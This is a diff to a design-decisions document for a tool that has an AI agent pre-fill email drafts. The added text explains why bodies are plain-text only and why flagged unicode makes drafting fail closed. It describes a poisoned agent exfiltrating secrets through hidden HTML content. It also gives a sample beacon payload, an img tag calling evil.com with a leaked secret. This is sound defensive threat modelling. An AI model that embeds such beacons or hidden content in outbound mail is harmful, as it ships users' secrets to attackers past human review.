@@ -619,8 +619,23 @@ Take these one at a time in later sessions.
 
    Settled sub-decisions:
    - **Body newlines → mailto `%0A`** (the headline residual, closed).
-   - **Plain-text `body` only** — no HTML; simplest, no HTML-injection
-     surface, and the human formats in TB if wanted.
+   - **Plain-text `body` only** — no HTML. Beyond "simplest," this is
+     **load-bearing for Q10's full-body pre-fill**: HTML hands a poisoned
+     agent two body-exfil vectors plain text lacks. (1) **Hidden content**
+     (white-on-white, `display:none`, tiny/off-screen) that the human's
+     compose-window review can't see but the message still carries —
+     defeating the pre-send "check the body" step. (2) **Remote beacons** —
+     `<img src="http://evil.com/?leaked=SECRET">` / CSS `url()` that
+     auto-fire when *any* recipient opens the mail, shipping laundered
+     secrets to an **arbitrary host**. Vector (2) is the sharper one: it
+     **punches through** Q10's "body is a weak channel because it goes to
+     the legit recipient" premise — the exfil destination is the URL host,
+     not the recipient, so a legit recipient no longer makes the body safe.
+     Plain text has neither: what the human sees *is* what's sent (modulo
+     unicode tricks — closed by Q10's fail-closed body sanitize), URLs are
+     inert visible text, nothing auto-fetches. So plain-text-only is a
+     *precondition* for full-body pre-fill being safe, not a convenience;
+     the human can still switch to formatted composing inside TB.
    - **Attachments → deferred to v2/v3** — the author-not-approver draft
      doesn't need them, and a file path/URL reintroduces the Q7
      staging/confinement problem. Add on real demand.
@@ -762,6 +777,25 @@ Take these one at a time in later sessions.
       zero-width, and mixed-script welds (`Pаypal`). The body keeps
       legitimate Unicode (emoji, accents); Sanitizer flags only the attack
       classes.
+      - **Body action on a flag = fail-closed (DECIDED 2026-07-14): error
+        and hand off nothing**, *not* neutralize-and-proceed. Rationale is
+        **direction of flow**: Sanitizer elsewhere protects a *human
+        reading attacker-controlled text* (neutralize + show), but a
+        compose body is *outbound and agent-authored* — it has no honest
+        reason to carry bidi overrides / zero-width / control bytes, so a
+        flag there is a **poison/injection signal** and the safe move is to
+        refuse. Degrades to the forced-authorship seat: the observation
+        names the offense and the human types the body in TB. **Scope to
+        validate at build (avoid false-positives):** emoji, accents, and
+        natural non-Latin scripts — *including RTL letters*
+        (Arabic/Hebrew) — must pass; only bidi *override/isolate* controls
+        (U+202A–202E / U+2066–2069), zero-width, and C0/C1 controls (bar
+        tab/newline) trip it. A blanket "any non-ASCII → error" would
+        wrongly refuse an emoji or an accented name. (Contrast the address
+        fields, which *do* enforce ASCII-only below — tolerable there,
+        absurd on a free-text body.) This is why plain-text-only (Q8)
+        closes the "modulo unicode tricks" gap: no HTML *and* no
+        attack-class unicode ⇒ what the human sees is exactly what sends.
     - **Address fields only (`to`/`cc`/`bcc`/`reply-to`): additionally
       enforce ASCII-only.** This closes exactly the confusable class
       Sanitizer *declares out of scope* — whole-script homoglyphs and
